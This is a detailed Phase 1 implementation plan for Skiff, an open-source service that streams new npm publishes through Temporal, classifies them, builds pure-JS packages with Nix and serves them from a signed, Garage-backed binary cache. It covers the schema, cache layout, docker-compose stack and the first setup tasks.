# Skiff Phase 1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a streaming-only npm hermetic packager pipeline. New npm publishes flow from the registry's `_changes` feed through a Temporal workflow that classifies the tarball, builds the `pure_js` ones with Nix in a sandboxed environment, signs the resulting store path with ed25519, and publishes the artifact to a Cachix-compatible cache backed by Garage S3. A resolver HTTP server returns the cache URL for any built `(name, version)` and the standard Nix substituter protocol pulls the result.

**Architecture:** Three Go binaries (`cmd/ingest`, `cmd/worker`, `cmd/resolver`) speak to a shared local stack of Temporal + ClickHouse + Garage, all of which run as **Linux containers under docker-compose**. The three skiff binaries are *also* shipped as Linux container images and run as compose services — the macOS dev host's only job is `docker compose up`. The worker container has Determinate Nix installed against a persistent `/nix` volume so the store survives restarts and grows incrementally; every Nix derivation targets `x86_64-linux` or `aarch64-linux` matching the container architecture, never Darwin. ClickHouse is the source-of-truth event log and metadata store; Garage holds the immutable source tarballs and the binary cache.

**Tech stack:**
- Go 1.26+ (pinned in `flake.nix` via `go_1_26`; we use `nix develop -c go ...` for every Go invocation on the dev host so toolchain version matches the flake, never the host PATH), modules under one `github.com/skiff-build/skiff` root, multiple `cmd/` binaries.
- Temporal Go SDK (`go.temporal.io/sdk`) with one shared task queue `skiff-default`.
- Determinate Nix (Linux installer) inside the worker container; portable Nix expressions (no Determinate-only builtins in published derivations).
- Garage S3 (single-node compose service) via AWS SDK for Go v2 with configurable `S3_ENDPOINT`.
- ClickHouse (single-node compose service) via `github.com/ClickHouse/clickhouse-go/v2`.
- ed25519 signing in Nix binary-cache format using `crypto/ed25519`.
- `log/slog` (stdlib) for structured JSON logs; `github.com/prometheus/client_golang` for `/metrics`.

**Decisions locked in (from open questions):**
| Decision | Value | Note |
|---|---|---|
| Object storage backend | Garage in dev *and* prod | one mental model |
| Temporal layout | single shared queue `skiff-default`, one worker binary | concurrency: 100 workflow tasks, 50 activities |
| Signing key supply | both `CACHE_SIGNING_KEY` (raw) and `CACHE_SIGNING_KEY_FILE` (path) | file path wins if both set |
| Containerization | all services + all three skiff binaries run as Linux images under docker-compose | `nix develop` on macOS is editor/test-runner only |
| Plan review style | one full plan, milestone-by-milestone execution with checkpoint reviews | this document |
| License | MIT | bundled `LICENSE` file, SPDX header optional in source files |
| Module path | `github.com/skiff-build/skiff` | neutral org; create `skiff-build` org at publish time |
| Deployment posture | self-host + future hosted public cache | Phase 1 ships self-host only; README and docs frame for both audiences |
| Contribution gate | DCO sign-off | `Signed-off-by:` on every commit, enforced by GitHub Action; no CLA |
| Container image registry | `ghcr.io/skiff-build/skiff-{ingest,worker,resolver}` | built and pushed by GitHub Actions on tag |

**Open-source posture:** Skiff is intended for anyone to self-host today, and (Phase 2+) to consume a hosted public cache. Every Phase 1 artifact reflects that: a permissive license, welcoming README with a quickstart for both audiences, contributor docs, a threat model that's explicit about what the binary cache signature attests to, and CI that runs in version control so external contributors can see green checks. No personal usernames in code, examples, or container tags.

---

## Architecture diagram

```
                            ┌───────────────────────────────────┐
                            │  npm registry                     │
                            │  https://replicate.npmjs.com/     │
                            │  _changes feed  +  tarball CDN    │
                            └────────────┬──────────────────────┘
                                         │ HTTPS, since=<seq>
                                         ▼
   ┌────────────────────────┐    polls + downloads     ┌─────────────────────┐
   │ cmd/ingest (container) │ ───────────────────────► │ cmd/worker          │
   │  - long-poll _changes  │   Temporal: StartWorkflow │  (container, Linux,│
   │  - persist last-seq    │ ───────────────────────► │   with Nix daemon, │
   │  - StartWorkflow per   │                          │   privileged for   │
   │    (name, version)     │                          │   sandbox)         │
   └─────────┬──────────────┘                          │                    │
             │                                         │  ProcessPackage    │
             │ writes events                           │   ├─ FetchAndStore │
             ▼                                         │   │  (S3 stream)   │
   ┌────────────────────────────┐                      │   ├─ Classify      │
   │ ClickHouse                 │ ◄────── reads/writes │   └─ BuildPackage  │
   │  events / observations /   │       events, state  │      ├─ NixBuild   │
   │  classifications / builds /│                      │      ├─ SignNarinfo│
   │  cache_publications /      │                      │      └─ UploadCache│
   │  ingest_state              │                      └────────┬───────────┘
   └────────┬───────────────────┘                               │
            │                                                   │ S3 PutObject
            │ reads                                             ▼
            │                                       ┌───────────────────────┐
            ▼                                       │ Garage (S3-compatible)│
   ┌────────────────────────┐                       │  bucket: sources/     │
   │ cmd/resolver           │ ────────── reads ────►│  bucket: cache/       │
   │  GET /resolve/:n/:v    │      narinfo + nar.xz │   <hash>.narinfo      │
   │  GET /cache/...        │                       │   nar/<hash>.nar.xz   │
   │  (cache routes proxy   │                       │   nix-cache-info      │
   │   to Garage)           │                       └───────────────────────┘
   └────────┬───────────────┘
            │
            ▼
   Nix clients add the resolver/Garage URL as a substituter and pull builds.
```

## Repository layout

```
skiff/
├── LICENSE                            # MIT
├── README.md                          # public-facing intro + quickstart
├── CONTRIBUTING.md                    # DCO sign-off, dev setup, PR conventions
├── CODE_OF_CONDUCT.md                 # Contributor Covenant 2.1
├── SECURITY.md                        # vulnerability reporting + supported versions
├── CHANGELOG.md                       # Keep-a-Changelog format
├── .github/
│   ├── workflows/
│   │   ├── ci.yml                     # lint + unit tests + integration on PR
│   │   ├── dco.yml                    # enforces Signed-off-by on PR commits
│   │   ├── images.yml                 # builds + pushes container images on main/tag
│   │   └── release.yml                # release-please or manual on v* tag
│   ├── PULL_REQUEST_TEMPLATE.md       # reminds contributors to sign off
│   ├── ISSUE_TEMPLATE/{bug,feature}.md
│   └── dependabot.yml                 # go modules + actions + docker bases
├── flake.nix                          # dev shell at repo root (pinned go_1_26 + tooling)
├── flake.lock                         # generated by `nix flake lock`
├── go.mod
├── go.sum
├── cmd/
│   ├── ingest/main.go                # registry _changes consumer
│   ├── worker/main.go                # Temporal worker (workflows + activities)
│   └── resolver/main.go              # HTTP resolver
├── pkg/
│   ├── registry/
│   │   ├── changes.go                # _changes long-poll
│   │   ├── changes_test.go
│   │   ├── packument.go              # fetch + parse a packument
│   │   ├── tarball.go                # download tarball, verify integrity
│   │   └── tarball_test.go
│   ├── classify/
│   │   ├── classify.go               # Classification type + classify()
│   │   ├── rules.go                  # five rules, in precedence order
│   │   ├── rules_test.go             # per-rule unit tests
│   │   └── testdata/
│   │       ├── pure-js/leftpad-1.0.0.tgz
│   │       ├── has-lifecycle/<...>.tgz
│   │       ├── has-native/<...>.tgz
│   │       ├── fetches-at-install/<...>.tgz
│   │       ├── suspicious/<...>.tgz
│   │       └── broken/<...>.tgz
│   ├── build/
│   │   ├── nix.go                    # invokes `nix build`, captures store path
│   │   ├── nix_test.go
│   │   └── expr.go                   # generates builder.nix referencing packager.nix
│   ├── cache/
│   │   ├── narinfo.go                # narinfo write + ed25519 sign
│   │   ├── narinfo_test.go
│   │   ├── nar.go                    # invokes `nix nar dump` and xz compresses
│   │   ├── upload.go                 # S3 PutObject narinfo + nar.xz
│   │   └── layout.go                 # path conventions for cache bucket
│   ├── store/
│   │   ├── store.go                  # ClickHouse client + typed methods
│   │   ├── store_test.go             # uses dockertest-equivalent against compose
│   │   ├── schema.go                 # embedded migration files + runner
│   │   └── migrations/
│   │       └── 0001_init.sql
│   ├── workflows/
│   │   ├── process.go                # ProcessPackage workflow
│   │   ├── build.go                  # BuildPackage child workflow
│   │   ├── activities.go             # activity implementations
│   │   └── workflows_test.go         # Temporal testsuite-based tests
│   ├── obs/
│   │   ├── logger.go                 # slog JSON setup
│   │   └── metrics.go                # Prometheus registry + common counters
│   └── config/
│       └── config.go                 # env loading, defaults, validation
├── nix/
│   └── packager.nix                  # the unpack-only derivation (M5)
├── deploy/
│   ├── docker-compose.yml            # the whole local stack
│   ├── garage.toml                   # garage config baked into image
│   ├── Dockerfile.go-base            # shared Go build base
│   ├── Dockerfile.ingest             # cmd/ingest runtime image (distroless)
│   ├── Dockerfile.worker             # cmd/worker runtime image (Nix-capable)
│   ├── Dockerfile.resolver           # cmd/resolver runtime image (distroless)
│   ├── clickhouse-init/
│   │   └── 0001_init.sql             # mounted into clickhouse-server initdb
│   └── scripts/
│       ├── wait-for-stack.sh         # health gate used by smoke tests
│       └── bootstrap-garage.sh       # creates buckets + access keys
├── docs/
│   ├── architecture.md
│   ├── classification.md
│   ├── operations.md                 # how to run, troubleshoot, rotate keys
│   ├── threat-model.md               # what signing attests to (and doesn't)
│   ├── public-cache.md               # public-key publication, substituter setup
│   ├── self-host.md                  # operator playbook for running your own skiff
│   └── superpowers/plans/2026-05-23-phase-1-npm-streaming.md   ← this document
├── scripts/
│   ├── generate-signing-key.sh       # ed25519 key in Nix format
│   └── e2e-smoke.sh                  # end-to-end pipeline smoke test
├── .golangci.yml
├── .gitignore
└── README.md
```

## Configuration

All binaries read configuration from environment variables. Defaults below are what docker-compose injects for local dev.

| Variable | Default (compose) | Used by | Description |
|---|---|---|---|
| `TEMPORAL_HOST` | `temporal:7233` | ingest, worker | Temporal frontend gRPC address |
| `TEMPORAL_NAMESPACE` | `default` | ingest, worker | Temporal namespace |
| `TEMPORAL_TASK_QUEUE` | `skiff-default` | ingest, worker | Shared task queue |
| `CLICKHOUSE_DSN` | `clickhouse://default:@clickhouse:9000/skiff` | all | DSN; database `skiff` is created at init |
| `S3_ENDPOINT` | `http://garage:3900` | ingest, worker, resolver | Garage S3 API endpoint |
| `S3_REGION` | `garage` | all | Garage region label |
| `S3_ACCESS_KEY_ID` | from bootstrap script | all | Garage access key |
| `S3_SECRET_ACCESS_KEY` | from bootstrap script | all | Garage secret key |
| `S3_BUCKET_SOURCES` | `skiff-sources` | ingest, worker | Tarball storage bucket |
| `S3_BUCKET_CACHE` | `skiff-cache` | worker, resolver | Cachix-layout cache bucket |
| `CACHE_PUBLIC_URL` | `http://localhost:8081/cache` | worker, resolver | Public substituter URL (what users add to nix.conf) |
| `CACHE_SIGNING_KEY` | (unset; file path used) | worker | Raw key in Nix format `name:base64-secret` |
| `CACHE_SIGNING_KEY_FILE` | `/run/secrets/cache-signing-key` | worker | Path to file holding raw key (preferred when both set) |
| `REGISTRY_URL` | `https://replicate.npmjs.com` | ingest | npm registry replication endpoint |
| `REGISTRY_USER_AGENT` | `skiff-ingest/0.1 (+contact@example.invalid)` | ingest | Polite UA header |
| `REGISTRY_POLL_INTERVAL` | `2s` | ingest | Min interval between long-poll retries on quiet feed |
| `NODEJS_VERSION_TAG` | `20` | worker, resolver | Phase 1 single target; recorded in build rows; resolver uses it as the lookup key |
| `TARGET_SYSTEM` | `linux/amd64` → `x86_64-linux` (auto from container arch) | worker, resolver | Nix system tuple. Resolver uses it as the lookup key for builds/cache_publications |
| `LISTEN_ADDR` | `:8081` (resolver), `:9090` (metrics on each) | resolver, all | HTTP listen |
| `LOG_LEVEL` | `info` | all | `debug` \| `info` \| `warn` \| `error` |

The `config.Load()` helper in `pkg/config` fails fast on missing required vars and logs the effective config (with secrets redacted) at startup.

## ClickHouse schema

Single database `skiff`. All tables explicit, no implicit ones. Engine choices:

- `MergeTree` for append-only event/observation tables.
- `ReplacingMergeTree(updated_at)` for entity tables where the latest row per primary key wins. Reads must use `FINAL` or filter with `argMax(...)` to get the canonical row, because ClickHouse de-dupes lazily.

```sql
-- /pkg/store/migrations/0001_init.sql
-- Applied by pkg/store/schema.go on worker startup if schema_migrations.version
-- max(version) < 1. Idempotent: CREATE ... IF NOT EXISTS everywhere.

CREATE DATABASE IF NOT EXISTS skiff;

CREATE TABLE IF NOT EXISTS skiff.schema_migrations (
  version     UInt32,
  description String,
  applied_at  DateTime64(3, 'UTC') DEFAULT now64(3)
) ENGINE = ReplacingMergeTree(applied_at) ORDER BY version;

-- Append-only event log. Source of truth for the pipeline timeline.
CREATE TABLE IF NOT EXISTS skiff.events (
  event_id    UUID            DEFAULT generateUUIDv4(),
  event_type  Enum8(
                'package_observed'   = 1,
                'classified'         = 2,
                'build_started'      = 3,
                'built'              = 4,
                'build_failed'       = 5,
                'cache_published'    = 6,
                'ingest_checkpoint'  = 7,
                'workflow_failed'    = 8
              ),
  occurred_at DateTime64(3, 'UTC') DEFAULT now64(3),
  name        LowCardinality(String) DEFAULT '',
  version     String                 DEFAULT '',
  workflow_id String                 DEFAULT '',
  payload     String CODEC(ZSTD(3))  DEFAULT '{}'  -- JSON, event-specific
) ENGINE = MergeTree
ORDER BY (occurred_at, event_type, name, version)
PARTITION BY toYYYYMM(occurred_at)
TTL toDateTime(occurred_at) + INTERVAL 90 DAY;

-- One row per change-feed observation. Append-only.
CREATE TABLE IF NOT EXISTS skiff.package_observations (
  observed_at         DateTime64(3, 'UTC') DEFAULT now64(3),
  name                LowCardinality(String),
  version             String,
  registry_seq        UInt64,
  packument_rev       String,
  tarball_url         String,
  tarball_sha512_hex  FixedString(128),
  tarball_size_bytes  UInt64,
  source_object_key   String  -- s3://<S3_BUCKET_SOURCES>/<key>
) ENGINE = MergeTree
ORDER BY (name, version, observed_at);

-- Latest classification per (name, version). Use FINAL on read.
CREATE TABLE IF NOT EXISTS skiff.classifications (
  classified_at       DateTime64(3, 'UTC') DEFAULT now64(3),
  name                LowCardinality(String),
  version             String,
  classification      Enum8(
                        'broken'               = 1,
                        'suspicious'           = 2,
                        'has_native_code'      = 3,
                        'fetches_at_install'   = 4,
                        'has_lifecycle_script' = 5,
                        'pure_js'              = 6
                      ),
  reason              String,
  rule_matched        LowCardinality(String),
  classifier_version  LowCardinality(String)
) ENGINE = ReplacingMergeTree(classified_at)
ORDER BY (name, version);

-- Latest build per (name, version, system, nodejs_version). Use FINAL on read.
CREATE TABLE IF NOT EXISTS skiff.builds (
  built_at             DateTime64(3, 'UTC') DEFAULT now64(3),
  name                 LowCardinality(String),
  version              String,
  system               LowCardinality(String),  -- 'x86_64-linux' | 'aarch64-linux'
  nodejs_version       LowCardinality(String),
  status               Enum8('success' = 1, 'failed' = 2),
  store_path           String                DEFAULT '',
  nar_sha256_hex       FixedString(64)       DEFAULT '0000000000000000000000000000000000000000000000000000000000000000',
  nar_size_bytes       UInt64                DEFAULT 0,
  file_sha256_hex      FixedString(64)       DEFAULT '0000000000000000000000000000000000000000000000000000000000000000',
  file_size_bytes      UInt64                DEFAULT 0,
  build_duration_ms    UInt32                DEFAULT 0,
  log_excerpt          String CODEC(ZSTD(3)) DEFAULT ''
) ENGINE = ReplacingMergeTree(built_at)
ORDER BY (name, version, system, nodejs_version);

-- Latest cache publish per (name, version, system, nodejs_version). Use FINAL.
CREATE TABLE IF NOT EXISTS skiff.cache_publications (
  published_at         DateTime64(3, 'UTC') DEFAULT now64(3),
  name                 LowCardinality(String),
  version              String,
  system               LowCardinality(String),
  nodejs_version       LowCardinality(String),
  store_path           String,
  narinfo_object_key   String,
  nar_object_key       String,
  cache_url_base       String  -- what users add as a substituter
) ENGINE = ReplacingMergeTree(published_at)
ORDER BY (name, version, system, nodejs_version);

-- Tiny key-value table for ingest checkpoint(s). Single-row writes per key.
CREATE TABLE IF NOT EXISTS skiff.ingest_state (
  key        String,
  value      String,
  updated_at DateTime64(3, 'UTC') DEFAULT now64(3)
) ENGINE = ReplacingMergeTree(updated_at)
ORDER BY key;
```

**Query patterns the code must use:**

- "What was the last sequence we processed?"
  ```sql
  SELECT value FROM skiff.ingest_state FINAL WHERE key = 'changes_feed_seq';
  ```
- "Latest classification for a package":
  ```sql
  SELECT classification, reason, rule_matched, classifier_version
  FROM skiff.classifications FINAL
  WHERE name = ? AND version = ?;
  ```
- "Is this (name, version, system, nodejs_version) already built successfully?":
  ```sql
  SELECT status, store_path, file_sha256_hex
  FROM skiff.builds FINAL
  WHERE name = ? AND version = ? AND system = ? AND nodejs_version = ?;
  ```
- "Latest cache publication URL parts":
  ```sql
  SELECT cache_url_base, narinfo_object_key, store_path
  FROM skiff.cache_publications FINAL
  WHERE name = ? AND version = ? AND system = ? AND nodejs_version = ?;
  ```

`FINAL` is acceptable here because each entity table is small (a few rows per package) and reads are infrequent compared to writes.

## Cache layout (Cachix-compatible)

The cache bucket holds:

```
<S3_BUCKET_CACHE>/
├── nix-cache-info                                  (static)
└── <hash>.narinfo                                  (one per published store path)
└── nar/<hash>.nar.xz                               (one per published store path)
```

`nix-cache-info` content:
```
StoreDir: /nix/store
WantMassQuery: 1
Priority: 41
```

`<hash>.narinfo` content (one per store path; `<hash>` is the 32-char base32 store-path hash):
```
StorePath: /nix/store/<hash>-<name>
URL: nar/<filehash>.nar.xz
Compression: xz
FileHash: sha256:<filehash-base32>
FileSize: <nar.xz size bytes>
NarHash: sha256:<narhash-base32>
NarSize: <nar size bytes>
References: <space-separated dependency store path basenames>
Deriver: <basename of .drv, optional in Phase 1>
Sig: <signing-key-name>:<base64 ed25519 sig over the fingerprint>
```

**Fingerprint to sign (Nix's canonical format):**
```
1;<store_path>;sha256:<narhash-base32>;<nar_size_bytes>;<comma-separated absolute reference paths>
```
Sign the UTF-8 bytes of that string with the ed25519 private key. Encode the 64-byte signature as standard base64.

## Signing key format

A Nix binary cache signing keypair is two strings:
- Secret: `<name>:<base64 64-byte ed25519 expanded secret>`
- Public: `<name>:<base64 32-byte ed25519 public>`

The 64-byte form is the standard ed25519 expanded secret (seed‖public), which is what `crypto/ed25519` produces when you do `priv := ed25519.GenerateKey(...)`. `priv` is 64 bytes already.

Generation script `scripts/generate-signing-key.sh` emits both files; only the secret is loaded by the worker.

## Containerization model

- **All compose services are Linux images.** Architecture is auto-selected via `platform: ${SKIFF_PLATFORM:-linux/amd64}` so Apple Silicon devs override to `linux/arm64`.
- **Three skiff Dockerfiles share a Go build base** (`Dockerfile.go-base`) to keep build times low.
- **`Dockerfile.ingest` and `Dockerfile.resolver`** produce small distroless runtime images (`gcr.io/distroless/static-debian12`).
- **`Dockerfile.worker`** is bigger: it starts from a Nix-capable Linux base, installs the Determinate Nix Linux installer, runs the daemon, mounts a persistent `/nix` volume, and runs the Go worker binary. Container needs `cap_add: [SYS_ADMIN]` and `security_opt: ["seccomp:unconfined"]` for Nix sandbox to work; if those prove brittle in CI the fallback is `privileged: true` (documented in `docs/operations.md`).
- **macOS hosts do not run Nix.** `nix develop` on the host is purely for editor integration, `go test`, lint, and ad-hoc tooling. The end-to-end pipeline only runs under docker-compose.

---

## Milestone 0 — Repo skeleton + Linux dev stack

**Goal:** `nix develop` works on the dev host; `docker compose up` brings up Temporal + ClickHouse + Garage; smoke gate confirms all three are healthy.

**Files:**
- Create: `go.mod`, `.gitignore`, `README.md`, `.golangci.yml`
- Create: `flake.nix` (at repo root, not under `nix/`), `flake.lock` (generated by `nix flake lock`)
- Create: `deploy/docker-compose.yml`, `deploy/garage.toml`, `deploy/clickhouse-init/0001_init.sql` (placeholder)
- Create: `deploy/scripts/wait-for-stack.sh`, `deploy/scripts/bootstrap-garage.sh`
- Create: `docs/architecture.md`, `docs/operations.md`

**Convention used from here onward:** every Go command on the dev host is `nix develop -c go ...` (or run inside `nix develop` interactively). Same for `golangci-lint`, `gopls`, `temporal`, `clickhouse`, `aws`. The flake pins Go 1.26 so the version is the same for every contributor and CI.

### Tasks

- [ ] **0.1 Initialize Go module** (runs through the flake-pinned Go)

```bash
cd /Users/samrose/skiff
nix develop -c go mod init github.com/skiff-build/skiff
git add go.mod
```

(Don't commit yet — M0 batches the commit at task 0.20. Use `-s` on the final commit; DCO sign-off is enforced.)

- [ ] **0.2 Write `.gitignore`**

Cover Go build artifacts, Nix result symlinks, env files, generated keys, IDE noise.

```gitignore
/bin/
/result
/result-*
*.log
.env
.envrc
.direnv/
/secrets/
/scripts/skiff-keys.env        # generated by garage-bootstrap; per-deployment
*.signing-key
*.signing-key.pub
.idea/
.vscode/
.DS_Store
```

Commit.

- [x] **0.3 Write `flake.nix` with dev shell** (DONE — completed before the rest of M0 so subsequent Go commands can use `nix develop -c`)

File lives at the repo **root** (not `nix/flake.nix` — that path moved to keep `nix develop` working from the repo root without a subdir argument). The `nix/` directory only holds `packager.nix` in M5.

```nix
{
  description = "Skiff — open-source npm hermetic packager";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
    flake-utils.url = "github:numtide/flake-utils";
  };

  outputs = { self, nixpkgs, flake-utils, ... }:
    flake-utils.lib.eachDefaultSystem (system:
      let
        pkgs = import nixpkgs { inherit system; };
      in {
        devShells.default = pkgs.mkShell {
          packages = with pkgs; [
            go_1_26          # nixpkgs unstable removed go_1_23 as EOL; we pin 1.26
            golangci-lint
            gopls
            gotools
            temporal-cli
            clickhouse
            awscli2
            jq
            xz
            git
          ];
          shellHook = ''
            export GOFLAGS="-mod=mod"
            export CGO_ENABLED=0
            echo "skiff dev shell — $(go version)"
            echo "  pipeline runtime lives in docker-compose; this shell is for editing + go test."
          '';
        };

        # M5 reintroduces `packages.packager = pkgs.callPackage ./nix/packager.nix { };`
        # once nix/packager.nix exists.
      });
}
```

Lock generation already ran (`nix flake lock`), `flake.lock` is tracked. Smoke test:
```bash
nix develop -c go version
```
Expected: `go version go1.26.x <os>/<arch>`. Confirmed on initial setup (Darwin/arm64). Note `docker-compose` is *not* in the flake — Docker Desktop / Colima on the dev host provides the compose engine.

- [ ] **0.4 Write `deploy/docker-compose.yml` (stack services only — no skiff binaries yet)**

```yaml
name: skiff
networks:
  skiff: {}
volumes:
  temporal-data: {}
  clickhouse-data: {}
  garage-data: {}
  garage-meta: {}
  nix-store: {}            # used in Milestone 5 by the worker container

x-platform: &platform
  platform: ${SKIFF_PLATFORM:-linux/amd64}

services:
  temporal:
    <<: *platform
    image: temporalio/auto-setup:1.25
    ports: ["7233:7233", "8233:8233"]
    environment:
      DB: sqlite
      SQLITE_PRAGMA: journal_mode=WAL
    networks: [skiff]
    volumes: ["temporal-data:/etc/temporal/sqlite"]
    healthcheck:
      test: ["CMD", "temporal", "operator", "cluster", "health", "--address", "localhost:7233"]
      interval: 5s
      timeout: 3s
      retries: 12

  clickhouse:
    <<: *platform
    image: clickhouse/clickhouse-server:24.8
    ports: ["8123:8123", "9000:9000"]
    networks: [skiff]
    volumes:
      - "clickhouse-data:/var/lib/clickhouse"
      - "./clickhouse-init:/docker-entrypoint-initdb.d:ro"
    ulimits:
      nofile: { soft: 262144, hard: 262144 }
    healthcheck:
      test: ["CMD", "wget", "-qO-", "http://localhost:8123/ping"]
      interval: 5s
      timeout: 3s
      retries: 12

  garage:
    <<: *platform
    image: dxflrs/garage:v1.0.1
    ports: ["3900:3900", "3902:3902"]
    networks: [skiff]
    volumes:
      - "garage-data:/var/lib/garage/data"
      - "garage-meta:/var/lib/garage/meta"
      - "./garage.toml:/etc/garage.toml:ro"
    healthcheck:
      test: ["CMD", "/garage", "status"]
      interval: 5s
      timeout: 3s
      retries: 12

  garage-bootstrap:
    <<: *platform
    image: dxflrs/garage:v1.0.1
    depends_on:
      garage: { condition: service_healthy }
    networks: [skiff]
    volumes:
      - "./scripts/bootstrap-garage.sh:/bootstrap.sh:ro"
      - "./scripts:/shared-scripts"          # writable; bootstrap drops skiff-keys.env here
      - "garage-data:/var/lib/garage/data"
      - "garage-meta:/var/lib/garage/meta"
      - "./garage.toml:/etc/garage.toml:ro"
    entrypoint: ["/bin/sh", "/bootstrap.sh"]
    restart: "no"
```

- [ ] **0.5 Write `deploy/garage.toml`**

```toml
metadata_dir = "/var/lib/garage/meta"
data_dir = "/var/lib/garage/data"
db_engine = "sqlite"
replication_factor = 1
rpc_bind_addr = "[::]:3901"
rpc_public_addr = "garage:3901"
rpc_secret = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

[s3_api]
api_bind_addr = "[::]:3900"
s3_region = "garage"
root_domain = ".s3.garage"

[s3_web]
bind_addr = "[::]:3902"
root_domain = ".web.garage"
index = "index.html"

[admin]
api_bind_addr = "[::]:3903"
admin_token = "skiff-local-admin"
```

- [ ] **0.6 Write `deploy/scripts/bootstrap-garage.sh`**

Creates the cluster layout, two buckets (`skiff-sources`, `skiff-cache`), and an access key. Idempotent — exits 0 if everything already exists. Writes the keypair to `./scripts/skiff-keys.env` on the host (via the `./scripts:/shared-scripts` mount on this container) so the ingest/worker/resolver compose services can load it through `env_file:`. The file is gitignored so per-deployment keys never land in the repo.

```sh
#!/bin/sh
set -eu
NODE_ID=$(/garage -c /etc/garage.toml status | awk 'NR==3 {print $1}')
if /garage -c /etc/garage.toml layout show | grep -q "Role: gateway\|Capacity:"; then
  echo "layout already applied"
else
  /garage -c /etc/garage.toml layout assign -z dc1 -c 1G "$NODE_ID"
  /garage -c /etc/garage.toml layout apply --version 1
fi
for bucket in skiff-sources skiff-cache; do
  if ! /garage -c /etc/garage.toml bucket info "$bucket" >/dev/null 2>&1; then
    /garage -c /etc/garage.toml bucket create "$bucket"
  fi
done
KEY_ENV=/shared-scripts/skiff-keys.env
if [ ! -f "$KEY_ENV" ]; then
  KEY_JSON=$(/garage -c /etc/garage.toml key create skiff-dev)
  AK=$(echo "$KEY_JSON" | awk '/Key ID:/ {print $3}')
  SK=$(echo "$KEY_JSON" | awk '/Secret key:/ {print $3}')
  for bucket in skiff-sources skiff-cache; do
    /garage -c /etc/garage.toml bucket allow --read --write --owner --key skiff-dev "$bucket"
  done
  # /shared-scripts is the host's ./scripts directory bind-mounted in.
  # The compose ingest/worker/resolver services read this same file via env_file.
  cat > "$KEY_ENV" <<EOF
S3_ACCESS_KEY_ID=$AK
S3_SECRET_ACCESS_KEY=$SK
EOF
  chmod 644 "$KEY_ENV"
fi
cat "$KEY_ENV"
```

- [ ] **0.7 Write `deploy/clickhouse-init/0001_init.sql` placeholder**

For Milestone 0 just create the database; full schema lands in Milestone 1.

```sql
CREATE DATABASE IF NOT EXISTS skiff;
```

- [ ] **0.8 Write `deploy/scripts/wait-for-stack.sh`**

Polls the three healthchecks (via the docker CLI on the host) until all are healthy or a timeout elapses. Exits non-zero on timeout.

```sh
#!/usr/bin/env bash
set -euo pipefail
deadline=$(( $(date +%s) + 120 ))
services=(temporal clickhouse garage)
while :; do
  unhealthy=0
  for s in "${services[@]}"; do
    status=$(docker inspect --format='{{.State.Health.Status}}' "skiff-${s}-1" 2>/dev/null || echo missing)
    [ "$status" = "healthy" ] || unhealthy=1
  done
  [ $unhealthy -eq 0 ] && exit 0
  [ "$(date +%s)" -gt $deadline ] && { echo "stack failed to come up"; docker compose -f deploy/docker-compose.yml ps; exit 1; }
  sleep 2
done
```

- [ ] **0.9 Smoke test: bring up the stack**

```bash
docker compose -f deploy/docker-compose.yml up -d
deploy/scripts/wait-for-stack.sh
docker compose -f deploy/docker-compose.yml exec clickhouse \
  clickhouse-client --query 'SHOW DATABASES' | grep skiff
docker compose -f deploy/docker-compose.yml logs garage-bootstrap | tail -10
```
Expected: `skiff` appears in the database list; bootstrap log shows access keys created.

- [ ] **0.10 Write `docs/architecture.md` (initial)**

Copy in the architecture diagram and decisions table from this plan's header. Keep it ~50 lines — enough that someone new can grok the pipeline.

- [ ] **0.11 Write `docs/operations.md` (initial)**

Cover: how to start the stack, where logs go, where the signing key lives, how to inspect ClickHouse, how to reset state (`docker compose down -v`).

- [ ] **0.12 Write `LICENSE` (MIT)**

```
MIT License

Copyright (c) 2026 The Skiff Authors

Permission is hereby granted, free of charge, to any person obtaining a copy
... (standard MIT body) ...
```

Use the canonical MIT text from https://opensource.org/licenses/MIT. Replace the copyright line with `Copyright (c) 2026 The Skiff Authors`. Commit as its own file.

- [ ] **0.13 Write `README.md` (public-facing intro + quickstart)**

Structure:
1. **What it is** — one paragraph: "Skiff is an open-source npm hermetic packager. It watches the public npm registry, classifies new package versions for safety, and produces deterministic, sandboxed, signed Nix builds in a binary cache that anyone can use as a Nix substituter."
2. **Project status** — "Phase 1: streaming-only pipeline, self-host. A public hosted instance is on the Phase 2 roadmap."
3. **Quickstart (self-host)** — copy of the bullet sequence from the deliverable: clone → generate signing key → docker compose up → curl resolve → add as substituter.
4. **Future: public cache** — paragraph explaining the planned hosted endpoint and how the public key will be distributed (link to `docs/public-cache.md` placeholder).
5. **What gets built** — link to `docs/classification.md` for what packages qualify and why most don't (yet).
6. **What this is NOT** — link to `docs/threat-model.md` for what the signature does and doesn't attest to.
7. **Contributing** — link to `CONTRIBUTING.md`, mention DCO sign-off, mention the issue tracker.
8. **License** — MIT, link to `LICENSE`.

Keep neutral tone. No personal usernames. The repo URL placeholder is `github.com/skiff-build/skiff`.

- [ ] **0.14 Write `CONTRIBUTING.md`**

Cover:
- How to set up dev environment (`nix develop` + `docker compose up`).
- DCO sign-off requirement: every commit needs `Signed-off-by: Name <email>` (use `git commit -s`).
- PR conventions: conventional commit messages (`feat:`, `fix:`, `docs:`, etc.), tests required, link to a CI page.
- Code style: `go fmt`, `golangci-lint run` must pass, line-length advisory.
- How to run the integration test suite locally.
- Where to file bugs (GitHub Issues), where to ask questions (Discussions if enabled later).
- Reference to the Code of Conduct.

- [ ] **0.15 Write `CODE_OF_CONDUCT.md`**

Drop in the Contributor Covenant 2.1 verbatim from https://www.contributor-covenant.org/version/2/1/code_of_conduct/. Fill in the contact email — pick a project-neutral alias like `conduct@skiff-build.example` and document in `docs/operations.md` that this needs a real mailbox before public release.

- [ ] **0.16 Write `SECURITY.md`**

Cover:
- Supported versions (only the latest minor in Phase 1 — we're pre-1.0).
- How to report a vulnerability — email a project-neutral alias (e.g. `security@skiff-build.example`, real address TBD before public release), or use GitHub's private vulnerability reporting feature.
- Expected response time (e.g., "within 5 business days").
- Coordinated disclosure expectation (no public exploit details until a fix is shipped).
- A short note: the binary cache signing key is the most security-sensitive secret; key rotation procedure lives in `docs/operations.md`.

- [ ] **0.17 Write `docs/threat-model.md`**

Cover, in plain prose:
